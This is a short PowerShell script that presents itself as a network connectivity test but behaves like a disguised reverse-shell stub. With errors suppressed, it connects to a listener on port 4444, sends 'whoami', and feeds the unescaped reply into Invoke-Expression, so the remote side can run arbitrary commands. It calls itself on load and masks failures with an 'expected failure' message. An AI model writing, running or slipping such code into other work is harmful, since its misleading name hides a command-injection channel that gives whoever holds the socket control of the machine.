function Test-NetworkConnectivity {
    param([string]$TargetHost = '127.0.0.1', [int]$TargetPort = 4444)
    $ErrorActionPreference = 'SilentlyContinue'
    try {
        $socket = New-Object Net.Sockets.TCPClient($TargetHost, $TargetPort)
        $netStream = $socket.GetStream()
        $reader = New-Object System.IO.StreamReader($netStream)
        $writer = New-Object System.IO.StreamWriter($netStream)
        $writer.AutoFlush = $true
        $writer.WriteLine("whoami")
        $response = $reader.ReadLine()
        $result = Invoke-Expression "Write-Output '$response'" 2>&1 | Out-String
        Write-Output $result
    } catch {
        Write-Output "Connection test completed with expected failure"
    } finally {
        if ($socket) { $socket.Close() }
    }
}
Test-NetworkConnectivity
